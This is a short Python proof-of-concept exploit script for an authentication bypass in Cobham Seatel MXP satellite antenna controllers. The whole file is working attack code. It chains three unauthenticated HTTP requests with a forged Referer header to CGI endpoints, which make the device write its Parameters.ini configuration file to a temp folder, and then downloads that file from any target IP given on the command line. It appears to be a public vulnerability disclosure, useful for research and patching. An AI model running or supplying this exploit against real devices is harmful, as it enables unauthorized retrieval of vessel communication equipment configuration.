# ###########################################
#
# PoC Cobham Seatel MXP auth bypass  
# to retrieve INI file with config parameters
#
#############################################
# MXP Version 148 
# MXP Version 164 (Build:224299)
# MXP Version 179 (Build:224945)
# 
# use python cobham_seatel_inifile-dump.py 127.0.0.1    (replace with proper ip)
#
# written by ObiWan666


import urllib
import argparse
import urllib.request
import wget
import time

parser = argparse.ArgumentParser()
parser.add_argument("target_IP")
args = parser.parse_args()
opfer = args.target_IP

#user_agent = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)'
#headers = { 'User-Agent' : user_agent }
#	myurl1 used to create the parameters in the firmware section
#	myurl2 used to create the INI file in the Temp folder
#	myurl3 download the INI file from Temp folder
  
myurl1 = 'http://' + opfer + '/cgi-bin/setFileType?filetype=FW'
myurl2 = 'http://' + opfer + '/cgi-bin/getDnFileNamePath?filetype=INI'
myurl3 = 'http://' + opfer + '/temp/Parameters.ini'
myref = 'http://' + opfer + '/MenuDealer.html'

req1 = urllib.request.Request(myurl1)
req1.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)')
req1.add_header('Referer', myref)

req2 = urllib.request.Request(myurl2) 
req2.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)')
req2.add_header('Referer', myref)

req3 = urllib.request.Request(myurl3) 
req3.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)')
req3.add_header('Referer', myref)

resp = urllib.request.urlopen(req1)
print(" pause 5 sec")
time.sleep(5) #pause 5 sec
resp = urllib.request.urlopen(req2)
print(" pause 20 sec to generate inifile")
time.sleep(20) #pause 20 sec
resp = urllib.request.urlopen(req3)
print(" pause 5 sec to download")
time.sleep(5) #pause 5 sec
wget.download(myurl3, 'C:\Daten\inifile.txt')

#print(myref)
#print(myurl1)
#print(myurl2)
#print(myurl3)


